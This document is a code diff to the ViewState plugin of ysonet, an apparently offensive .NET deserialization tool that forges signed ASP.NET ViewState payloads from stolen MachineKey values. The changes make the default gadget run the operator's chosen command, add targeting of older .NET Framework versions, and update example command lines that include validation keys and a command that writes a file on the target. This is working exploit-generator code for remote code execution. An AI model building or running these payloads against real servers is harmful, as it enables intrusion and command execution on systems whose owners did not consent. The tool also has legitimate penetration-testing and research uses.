@@ -19,7 +19,7 @@ using ysonet.Helpers.Core;
  * Comments: 
  *  This is used when the MachineKey parameters have been stolen for example by downloading the web.config or machine.config file via another vulnerability
  *  This is not going to be useful when web.config sensitive parameters have been properly encrypted or when "AutoGenerate" has been used
- *  Also see https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/ for more details
+ *  Also see https://soroush.me/blog/exploiting-deserialisation-in-asp-net-via-viewstate for more details
  *  
  *  Kudos to Alvaro Muñoz for the support
  **/
@@ -34,7 +34,15 @@ namespace ysonet.Plugins
         static bool minify = false;
         static bool useSimpleType = true;
         static bool isDebug = false;
-        static string gadget = "ActivitySurrogateSelector";
+        // The gadget this plugin builds when -g is not given. TextFormattingRunProperties
+        // rather than ActivitySurrogateSelector: it produces a much smaller ViewState and it
+        // RUNS THE OPERATOR'S -c COMMAND. ActivitySurrogateSelector declares
+        // CommandInputType.Ignored and always runs its prebuilt e.dll, so with it as the
+        // default a -c value was silently discarded and the payload did something the
+        // operator never asked for.
+        public const string DefaultGadget = "TextFormattingRunProperties";
+
+        static string gadget = DefaultGadget;
         static string command = "";
         static bool rawcmd = false;
         static bool cmdstdin = false;
@@ -54,6 +62,7 @@ namespace ysonet.Plugins
         static string validationKey = "";
         static bool isOSF = false;
         static bool dosAcknowledged = false;
+        static bool legacyFx = false;
         static string macEncodingKey = "";
         static string currentViewStateStr = "";
 
@@ -69,8 +78,8 @@ namespace ysonet.Plugins
         {
             {"examples", "Show a few examples. Other parameters will be ignored.", v => showExamples = v != null },
             {"dryrun", "Create a valid ViewState without using an exploit payload. The gadget and command parameters will be ignored.", v => dryRun = v != null },
-            {"g|gadget=", "A gadget chain that supports LosFormatter. Default: ActivitySurrogateSelector.", v => gadget = v },
-            {"c|command=", "The command suitable for the used gadget (will be ignored for ActivitySurrogateSelector).", v => command = v },
+            {"g|gadget=", "A gadget chain that supports LosFormatter. Default: " + DefaultGadget + ".", v => gadget = v },
+            {"c|command=", "The command suitable for the used gadget. A few gadgets ignore it and run a fixed payload instead - ActivitySurrogateSelector is the one you are most likely to pick - and for those any placeholder works.", v => command = v },
             {"rawcmd", "Command will be executed as is without `cmd /c ` being appended (anything after the first space is an argument).", v => rawcmd = v != null },
             {"s|stdin", "The command to be executed will be read from standard input (the first line, up to 2,050 bytes). A non-empty command wins.", v => cmdstdin = v != null },
             {"usp|unsignedpayload=", "The unsigned LosFormatter payload (base64 encoded). The gadget and command parameters will be ignored.", v => unsignedPayload = v },
@@ -93,6 +102,7 @@ namespace ysonet.Plugins
             {"osf|objectstateformatter", "This is to simulate ObjectStateFormatter with a MAC encoding key on its own.", v => isOSF = v != null },
             {"mk|mackey=", "The ObjectStateFormatter MAC encoding key in base64. Only used with the 'osf' option.", v => macEncodingKey = v },
             {"isdebug", "Show useful debugging messages.", v => isDebug = v != null },
+            {"legacyfx", "Target the .NET Framework 2.0/3.0/3.5 (CLR v2) generation. This reaches the GADGET only; the ViewState envelope and its signature name no framework assembly. Pair it with 'islegacy', which selects the matching pre-4.5 signing algorithm. Default: false", v => legacyFx = v != null },
             {Helpers.Core.DosPolicy.AckOptionName, Helpers.Core.DosPolicy.AckHelp, v => dosAcknowledged = v != null },
         };
 
@@ -114,6 +124,18 @@ namespace ysonet.Plugins
         // A public plugin: it is listed everywhere, with or without --display-private.
         public bool IsPrivate() { return false; }
 
+        // Earned end to end. The LEGACY rows feed the complete signed value to a Page-owned
+        // ObjectStateFormatter on 2.0/3.0/3.5, while the CLR4 row uses the framework's
+        // HiddenFieldPageStatePersister purpose. Both require matching-key acceptance plus
+        // wrong-key and tampered rejection before the nested object effect counts as a fire.
+        // The plugin selects the legacy algorithm through 4.0 and the modern purpose-based
+        // algorithm from 4.5 onward, so those measured endpoints support the contiguous span.
+        public List<string> RuntimeVersions()
+        {
+            return new List<string>(RuntimeVersion.Range(RuntimeVersion.NetFx20,
+                RuntimeVersion.NetFx481));
+        }
+
         public OptionSet Options()
         {
             return options;
@@ -126,11 +148,17 @@ namespace ysonet.Plugins
         public List<PluginMode> InteractiveModes()
         {
             // Shared settings offered in every mode.
+            //
+            // This is an ALLOW-LIST: an option missing from it is silently invisible in the
+            // interactive editor while still working on the command line. That is how
+            // 'legacyfx' went missing after it was added to the OptionSet, so a new option
+            // here has to be added in the same change. PluginModeOptionsCoverEveryOption
+            // fails the build when one is forgotten.
             string[] common = new string[] {
                 "validationkey", "validationalg", "path", "apppath", "pathisclass",
                 "generator", "islegacy", "isencrypted", "decryptionkey", "decryptionalg",
                 "viewstateuserkey", "objectstateformatter", "mackey", "currentviewstate",
-                "showraw", "minify", "usesimpletype"
+                "showraw", "minify", "usesimpletype", "legacyfx"
             };
             return new List<PluginMode>
             {
@@ -170,6 +198,37 @@ namespace ysonet.Plugins
         {
             InputArgs inputArgs = new InputArgs();
             List<string> extra;
+
+            // OptionSet writes into static fields. Restore every documented default before
+            // parsing so repeated in-process runs cannot inherit a prior invocation.
+            showExamples = false;
+            showraw = false;
+            dryRun = false;
+            minify = false;
+            useSimpleType = true;
+            isDebug = false;
+            gadget = DefaultGadget;
+            command = "";
+            rawcmd = false;
+            cmdstdin = false;
+            unsignedPayload = "";
+            isUnsignedPayloadAFile = false;
+            isLegacy = false;
+            viewstateGenerator = "";
+            targetPagePath = "";
+            pathIsClassName = false;
+            IISAppInPathOrVirtualDir = "";
+            viewStateUserKey = null;
+            isEncrypted = false;
+            decryptionAlg = "AES";
+            decryptionKey = "";
+            validationAlg = "";
+            validationKey = "";
+            isOSF = false;
+            dosAcknowledged = false;
+            legacyFx = false;
+            macEncodingKey = "";
+            currentViewStateStr = "";
             try
             {
                 extra = options.Parse(args);
@@ -196,6 +255,16 @@ namespace ysonet.Plugins
                 inputArgs.IsRawCmd = rawcmd;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
+                // Reaches the inner gadget's generation boundary only. The ViewState
+                // envelope and its signature name no framework assembly.
+                inputArgs.LegacyFx = legacyFx;
+                // Anything this plugin did not recognise belongs to the gadget the user
+                // chose with -g, so it is forwarded rather than dropped. Without this a
+                // gadget option typed on a plugin command line (--var, for example) goes
+                // nowhere and the operator silently gets the default variant. Only the
+                // LEFTOVER args travel: an option this plugin declares was already
+                // consumed by the parse above, so the two cannot collide.
+                inputArgs.ExtraArguments = extra;
             }
             catch (OptionException e)
             {
@@ -219,20 +288,15 @@ namespace ysonet.Plugins
             if (String.IsNullOrEmpty(command) && !dryRun && !cmdstdin && String.IsNullOrEmpty(unsignedPayload))
             {
                 string msg = "ViewState needs a payload source. Do one of: set a 'command' (the gadget runs it; "
-                    + "for ActivitySurrogateSelector any placeholder works), or turn on 'dryrun' (a valid ViewState "
-                    + "with no exploit), or provide an 'unsignedpayload'. A 'validationkey' is also required.";
+                    + "a gadget that ignores it, such as ActivitySurrogateSelector, accepts any placeholder), or "
+                    + "turn on 'dryrun' (a valid ViewState with no exploit), or provide an 'unsignedpayload'. "
+                    + "A 'validationkey' is also required.";
                 Console.Write("ysonet: ");
                 Console.WriteLine(msg);
                 Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                 ShowExamples();
                 throw new Exception(msg);
             }
-
-            var types = Helpers.AssemblyTypeScanner.SafeGetAllTypes();
-
-            // Populate list of available gadgets
-            var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface);
-            var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList();
 
             uint parsedViewstateGeneratorIdentifier = 0;
             if (!String.IsNullOrEmpty(viewstateGenerator))
@@ -273,58 +337,22 @@ namespace ysonet.Plugins
             }
             else
             {
-                if (!generators.Contains(gadget))
+                // The shared resolver owns the name lookup, the denial-of-service gate
+                // (refused BEFORE the formatter check, so a missing acknowledgement is
+                // what the operator is told) and the formatter check. It replaced a
+                // hand-built type name passed to Activator.CreateInstance, which could
+                // not resolve a gadget outside ysonet.Generators.
+                inputArgs.DosAcknowledged = dosAcknowledged;
+                Helpers.Core.RunResult gadgetResult =
+                    Helpers.Core.PayloadRunner.GeneratePluginGadget(gadget, formatter, inputArgs);
+                if (!gadgetResult.Success)
                 {
-                    Console.WriteLine("Gadget not supported.");
-                    throw new Exception("Gadget not supported.");
+                    Console.WriteLine(gadgetResult.ErrorMessage);
+                    throw new Exception(gadgetResult.ErrorMessage);
                 }
-
-                // Instantiate Payload Generator
-                IGenerator generator = null;
-                try
-                {
-                    var container = Activator.CreateInstance(null, "ysonet.Generators." + gadget + "Generator");
-                    generator = (IGenerator)container.Unwrap();
-                }
-                catch
-                {
-                    Console.WriteLine("Gadget not supported!");
-                    throw new Exception("Gadget not supported!");
-                }
-
-                // A denial-of-service gadget is refused before the formatter check, so
-                // the reason a user sees is always the missing acknowledgement rather
-                // than an unrelated incompatibility found first.
-                string dosRefusal = Helpers.Core.DosPolicy.RefusalIfUnacknowledged(gadget, dosAcknowledged);
-                if (!string.IsNullOrEmpty(dosRefusal))
-                {
-                    Console.WriteLine(dosRefusal);
-                    throw new Exception(dosRefusal);
-                }
-
-                // Check Generator supports specified formatter
-                if (generator.IsSupported(formatter))
-                {
-                    // A user-selected gadget goes through the shared runner, never
-                    // Generate* directly, so the DoS policy and its warning are the
-                    // same here as on the command line.
-                    inputArgs.DosAcknowledged = dosAcknowledged;
-                    Helpers.Core.RunResult gadgetResult =
-                        Helpers.Core.PayloadRunner.GenerateSelectedGadget(generator, formatter, inputArgs);
-                    if (!gadgetResult.Success)
-                    {
-                        Console.WriteLine(gadgetResult.ErrorMessage);
-                        throw new Exception(gadgetResult.ErrorMessage);
-                    }
-                    foreach (string warning in gadgetResult.Warnings)
-                        Console.Error.WriteLine(warning);
-                    payloadString = System.Text.Encoding.ASCII.GetString((byte[])gadgetResult.Raw);
-                }
-                else
-                {
-                    Console.WriteLine("LosFormatter not supported.");
-                    throw new Exception("LosFormatter not supported.");
-                }
+                foreach (string warning in gadgetResult.Warnings)
+                    Console.Error.WriteLine(warning);
+                payloadString = System.Text.Encoding.ASCII.GetString((byte[])gadgetResult.Raw);
             }
 
             if (string.IsNullOrEmpty(validationKey))
@@ -831,7 +859,7 @@ namespace ysonet.Plugins
 
 .\ysonet.exe -p ViewState -g TextFormattingRunProperties -c ""echo 123 > c:\windows\temp\test.txt"" --generator=93D20A1B --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""
 
-.\ysonet.exe -p ViewState -c ""foo to use ActivitySurrogateSelector"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --islegacy --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --isencrypted --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""
+.\ysonet.exe -p ViewState -g ActivitySurrogateSelector -c ""any placeholder"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --islegacy --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --isencrypted --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""
 ";
 
             Console.WriteLine("Examples:");
